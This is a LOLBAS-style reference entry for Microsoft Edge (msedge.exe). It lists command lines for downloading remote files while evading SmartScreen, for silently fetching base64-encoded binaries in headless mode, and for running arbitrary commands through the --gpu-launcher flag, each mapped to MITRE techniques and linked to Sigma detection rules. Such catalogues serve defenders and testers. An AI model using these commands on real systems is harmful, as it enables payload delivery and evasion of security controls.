---
Acknowledgement:
- Person: mr.
Author: mr.d0x
Commands:
- Category: Download
  Command: msedge.exe {REMOTEURL:.exe.txt}
  Description: Edge will launch and download the file. A 'harmless' file extension
    (e.g. .txt, .zip) should be appended to avoid SmartScreen.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Download file from the internet
- Category: Download
  Command: msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}"
    > {PATH:.b64}
  Description: Edge will silently download the file. File extension should be .html
    and binaries should be encoded.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Download file from the internet
- Category: Execute
  Command: msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
  Description: Edge spawns cmd.exe as a child process of msedge.exe and executes the
    specified command
  MitreID: T1218.015
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Executes a process under a trusted Microsoft signed binary
Created: 2022-01-20
Description: Microsoft Edge browser
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml
Full_Path:
- Path: c:\Program Files\Microsoft\Edge\Application\msedge.exe
- Path: c:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Name: Msedge.exe
Resources:
- Link: https://twitter.com/mrd0x/status/1478116126005641220
- Link: https://twitter.com/mrd0x/status/1478234484881436672
mitre_data:
  technique_ids:
  - T1105
  - T1218.015
tags:
- lolbas/osbinaries
---

# Msedge.exe

Microsoft Edge browser

# Path(s)

- `c:\Program Files\Microsoft\Edge\Application\msedge.exe`
- `c:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`

# Execute Commands

Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command

```batch
msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
```

- **Usecase:** Executes a process under a trusted Microsoft signed binary
- **Privileges Required:** User
- **MitreID:** `T1218.015`
- **Operating System(s):** Windows 10, Windows 11



# Download Commands

Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.

```batch
msedge.exe {REMOTEURL:.exe.txt}
```

- **Usecase:** Download file from the internet
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



Edge will silently download the file. File extension should be .html and binaries should be encoded.

```batch
msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
```

- **Usecase:** Download file from the internet
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://twitter.com/mrd0x/status/1478116126005641220
- https://twitter.com/mrd0x/status/1478234484881436672
# Acknowledgements

- mr.d0x (Authored, 2022-01-20)
- mr.